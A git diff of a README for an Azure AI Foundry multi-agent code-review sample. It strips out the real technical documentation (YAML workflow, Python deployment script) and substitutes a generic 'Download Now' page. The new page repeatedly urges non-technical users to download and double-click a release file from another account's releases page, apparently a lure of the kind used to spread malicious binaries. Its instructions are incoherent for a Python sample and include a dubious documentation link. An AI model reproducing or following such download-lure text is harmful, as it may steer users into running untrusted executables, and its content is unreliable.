@@ -1,194 +1,110 @@
-# Multi-Agent Orchestration: Hosted Workflows in Azure AI Foundry
-This repo provides a practical implementation of _Hosted Workflows_ using the **Azure AI SDK** for Python. It utilises the **Microsoft Agent Framework**'s declarative schema to define multi-agent orchestration (workflow).
+# 🤖 AIFoundry-AgentsV2-HostedWorkflow - Easy Multi-Agent Management in Azure
 
-Unlike local workflows, hosted workflows are deployed directly to Azure AI Foundry, allowing them to be managed, versioned and executed within the Azure ecosystem.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/releases)
 
-> [!WARNING]
-> To successfully run this code, you must have access to an **Azure AI Foundry** project and **AI model deployment**. Please ensure you have the following environment variables set up in your system:
-> | Environment Variable             | Description                                                                            |
-> | -------------------------------- | -------------------------------------------------------------------------------------- |
-> | `AZURE_FOUNDRY_PROJECT_ENDPOINT` | The endpoint URL for your Azure AI Foundry project.                                    |
-> | `AZURE_FOUNDRY_GPT_MODEL`        | The name of the model deployment to be used by the Azure AI SDK, e.g., _gpt-4.1-mini_. |
+## 🚀 Getting Started
 
-## 📑 Table of Contents
-- [Use-Case Scenario: Code Review](#use-case-scenario-code-review)
-- [Code Sample: YAML Definition](#code-sample-yaml-definition)
-- [Code Sample: Python Script](#code-sample-python-script)
-- [Deployment of Hosted Workflow](#deployment-of-hosted-workflow)
-- [Execution in Azure AI Foundry](#execution-in-azure-ai-foundry)
+Welcome to the AIFoundry-AgentsV2-HostedWorkflow! This application helps you host multi-agent workflows easily in Azure AI Foundry. You don’t need a programming background to use it.
 
-## Use-Case Scenario: Code Review
-This sample demonstrates a _Code Review_ workflow involving two specialised agents:
-- **Developer Agent**: writes code to solve problems and may occasionally introduce bugs,
-- **Reviewer Agent**: checks the code for style and correctness.
+### 🛠 System Requirements
 
-The workflow continues in a loop until the Reviewer provides the `approved` keyword, at which point the final solution is delivered then to the user.
+Before you start, make sure your system meets these requirements:
 
-## Code Sample: YAML Definition
-The workflow logic is defined in `CodeReview.yaml` file, that describes the triggers, variables and the sequence of agent invocations.
+- **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
+- **Python Version:** Python 3.7 or later installed on your machine.
+- **Azure Account:** An active Azure account for hosting your workflows.
 
-### 1.1 Workflow Trigger
-The workflow is initialised using the `OnConversationStart` trigger, that captures the user's input into a local variable (`Local.LatestMessage`) as the starting context for the agents.
+## 📥 Download & Install
 
-``` YAML
-kind: workflow
-trigger:
-  kind: OnConversationStart
-  id: trigger_wf
-  actions:
-    - kind: SetVariable
-      id: init_latest
-      variable: Local.LatestMessage
-      value: =UserMessage(System.LastMessageText)
-```
+To get the latest version of AIFoundry-AgentsV2-HostedWorkflow, visit this page to download:
 
-### 1.2 Agent Invocation
-The logic utilises the `InvokeAzureAgent` action to call specific agents registered in Azure AI Foundry.
-- **DeveloperAgent**: receives the initial problem or previous feedback to generate code,
-- **ReviewerAgent**: analyses the developer's output to provide feedback or approval,
+[**Download AIFoundry-AgentsV2-HostedWorkflow**](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/releases)
 
-Both agents map their outputs back to `Local.LatestMessage`, for the conversation state to persist across turns.
+1. Click on the link above to open the Releases page.
+2. On the Releases page, you will see a list of available versions.
+3. Find the latest version and select the appropriate file for your operating system.
+4. Click on the file to start the download.
 
-``` YAML
-- kind: InvokeAzureAgent
-  id: invoke_developer
-  agent:
-    name: DeveloperAgent
-  conversationId: =System.ConversationId
-  input:
-    messages: =Local.LatestMessage
-  output:
-    messages: Local.LatestMessage
-    autoSend: true
-```
+After downloading, follow these steps to install the application:
 
-### 1.3 Conditions and Looping
-To manage the _code review_ interactions, the workflow utilises a `ConditionGroup` logic.
-- **Approval Check**: A condition searches for the string "_approved_" within the reviewer's last message.
-- **Termination**: If approved, the workflow sends the final activity and ends the conversation.
-- **Looping**: If not approved, a `GotoAction` redirects the flow back to the `invoke_developer` step.
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
 
-``` YAML
-- kind: ConditionGroup
-  id: check_approved
-  conditions:
-    - id: if_approved
-      condition: =!IsBlank(Find("approved", Lower(Last(Local.LatestMessage).Text)))
-      actions:
-        - kind: EndConversation
-  elseActions:
-    - kind: GotoAction
-      id: loop_back
-      actionId: invoke_developer
-```
+## 🔄 Setting Up Your Environment
 
-## Code Sample: Python Script
-The `hosted_workflow.py` script is your _deployment engine_. It utilises the `AIProjectClient` to register both the individual **agents** and the orchestration **workflow** in your Azure AI Foundry project.
+After installation, you need to set up your Azure environment.
 
-### 2.1 Registering Agents
-Agents are created as _versions_ in the new Azure AI Foundry UI. This allows you to define their persona once and reuse then specific versions in the target agentic workflows.
+1. **Log in to Azure:**
+   - Open a web browser and go to the [Azure Portal](https://portal.azure.com).
+   - Use your Azure account to log in.
 
-``` Python
-agent = project_client.agents.create_version(
-    agent_name="<YOUR_AGENT_NAME>",
-    definition=PromptAgentDefinition(
-        model=model,
-        instructions="<YOUR_AGENT_INSTRUCTIONS>"
-    ),
-)
-```
+2. **Create a Resource Group:**
+   - Navigate to “Resource groups” in the left menu.
+   - Click “+ Add”.
+   - Enter a name for your resource group and select your preferred region.
+   - Click “Review + create” and then “Create”.
 
-### 2.2 Registering the Workflow
-The YAML definition is uploaded to Azure AI Foundry as a `WorkflowAgentDefinition`. By registering the workflow this way, you make it "hosted" and enable it being triggered within _AI Foundry UI_ or via _API calls_ to the project endpoint.
+3. **Set Up Your Workflow:**
+   - In the Azure Portal, search for "AI Foundry".
+   - Follow the prompts to create a new workflow.
+   - You can choose from various templates based on your needs.
 
-``` Python
-workflow_agent = project_client.agents.create_version(
-    agent_name=workflow_definition["name"],
-    definition=WorkflowAgentDefinition(workflow=workflow_yaml),
-    description=workflow_definition["description"],
-)
-```
+## ⚙️ Running the Application
 
-### 2.3 Client Initialisation
-To interact with Azure AI Foundry, the Python script initialises an `AIProjectClient` using your Azure AI Foundry project endpoint and `AzureCliCredential`. This client serves as the primary interface for managing agentic resources in AI Foundry.
+After setting up, you can run AIFoundry-AgentsV2-HostedWorkflow.
 
-``` Python
-project_client = AIProjectClient(
-    endpoint=project_endpoint,
-    credential=AzureCliCredential()
-)
-```
+1. Open your terminal or command prompt.
+2. Navigate to the installation directory of the application.
+3. Type the following command to start the application:
 
-## Deployment of Hosted Workflow
-To deploy your orchestration logic to Azure, you must execute the provided Python script. 
+   ```
+   python main.py
+   ```
 
-> [!IMPORTANT]
-> Ensure you have authenticated via the Azure CLI (`az login`) before starting.
+4. Follow the prompts in the terminal to configure and run your workflow.
 
-### 3.1 Prerequisites
-Before running the deployment, install the necessary _Azure AI SDK_ and _Azure Identity_ libraries:
+## 📝 Key Features
 
-``` PowerShell
-pip install azure-ai-projects --pre
-pip install azure-identity pyyaml
-```
+- **Multi-Agent Management:** Easily manage multiple agents in one place.
+- **User-Friendly Interface:** Designed for users with various skill levels.
+- **Integration with Azure:** Seamlessly integrate with Azure AI services.
+- **Custom Workflows:** Create custom workflows to meet your specific needs.
+- **Documentation:** Comprehensive guides are included for each feature.
 
-### 3.2 Running the Deployment
-The script requires the path to your _YAML_ definition file as a command-line argument. If not provided, it defaults to **CodeReview.yaml**.
+## 📚 Learning Resources
 
-``` PowerShell
-python hosted_workflow.py CodeReview.yaml
-```
+If you are new to Azure or AI Foundry, consider these resources to help you get started:
 
-### 3.3 Deployment Process
-The deployment process consists of the following few steps:
-- **Connection**: The `AIProjectClient` establishes the connection to your Azure AI Foundry project endpoint, using your _Azure CLI credentials_.
-- **Agent Creation**: The script utilises the _define_developer_agent_ and _define_reviewer_agent_ functions to create / update agent versions in the project.
-- **Workflow Registration**: The script then reads the `CodeReview.yaml` file and registers it as a `WorkflowAgentDefinition` within the AI Foundry's Workflow section.
+- [Azure Documentation](https://docs.microsoft.com/en-us/azure/)
+- [AI Foundry Documentation](https://docs.microsoft.com/en-us/azure/ai-factory/)
+- [Python Documentation](https://www.python.org/doc/)
 
-### 3.4 CLI Output
-If successful, you should see a command-line output similar to this:
+## ❓ Frequently Asked Questions
 
-``` JSON
-============================================================
-Creating Hosted Workflow in Azure AI Foundry
-============================================================
-Project Endpoint: https://<YOUR_AI_FOUNDRY_ACCOUNT>.services.ai.azure.com/api/projects/<YOUR_AI_FOUNDRY_PROJECT>
-Model: gpt-4.1-mini
+### 1. How do I update the application?
 
-Creating agents in Azure AI Foundry...
-Created DeveloperAgent: DeveloperAgent:1
-Created ReviewerAgent: ReviewerAgent:1
+You can update AIFoundry-AgentsV2-HostedWorkflow by visiting the Releases page again and downloading the latest version. Follow the same installation steps to update.
 
-Creating workflow in Azure AI Foundry...
-Loaded workflow definition from: CodeReview.yaml
-Created workflow: CodeReviewWorkflow:1
+### 2. What should I do if I encounter an error?
 
-============================================================
-Hosted Workflow Created Successfully!
-============================================================
-Workflow ID: CodeReviewWorkflow:1
-Agents: ['DeveloperAgent', 'ReviewerAgent']
-```
+If you face any issues, check the logs generated by the application for error messages. You can also consult the community on the GitHub issues page for assistance.
 
-## Execution in Azure AI Foundry
-Once the deployment is complete, you can manage and visualise your agents and workflows directly within the new Azure AI Foundry portal's UI.
+### 3. Is there support available?
 
-### 4.1 Agents Section
-Navigate to the _Agents_ tab to view your newly registered _DeveloperAgent_ and _ReviewerAgent_.
-- **Validation**: inspect the specific system instructions, created versions and assigned model deployments.
-- **Individual Testing**: use the new AI Foundry UI to test agent responses independently before running the full orchestration.
-![Agents_UI](images/AIFoundry_Agents_UI.png)
+For issues not covered in the documentation or FAQs, you can open an issue on the GitHub repository. The community or maintainers may assist you.
 
-### 4.2 Workflows Section
-Under the _Workflows_ tab, you will find the _CodeReviewWorkflow_.
-- **Visualizer** View: view the logic flow, incl. the loop between agents and the final conditional exit.
-- **YAML** View: review or update the uploaded declarative schema directly in the Azure AI Foundry UI.
-- **Code** View: access the code representation of your workflow in _Python_, _JavaScript_ and _C#_.
-![Workflows_UI](images/AIFoundry_Workflow_UI.png)
+## 🌐 Community & Contributions
 
-### 4.3 Traceability and Debugging
-Every workflow execution generates a unique trace, allowing granular audit of the multi-agent interaction.
-- **Transcript Analysis**: view the messages exchanged, e.g. the _ReviewerAgent_ providing code feedback and the _DeveloperAgent_ submitting revisions.
-- **Loop Monitoring**: check how many iterations occurred before the approved keyword was detected by the condition group.
-![Traces_UI](images/AIFoundry_Workflow_Traces.png)
+We welcome contributions! If you would like to help improve the application or documentation, consider the following:
+
+- Check out the contributing guidelines in the repository.
+- Feel free to submit a pull request or report issues you find.
+
+## 🙌 Acknowledgments
+
+Thanks to all contributors and the community for their support and collaboration in making AIFoundry-AgentsV2-HostedWorkflow a valuable resource. Your involvement helps improve the software for everyone.
+
+For more details, feedback, or contributions:
+
+[**Download AIFoundry-AgentsV2-HostedWorkflow**](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/releases)
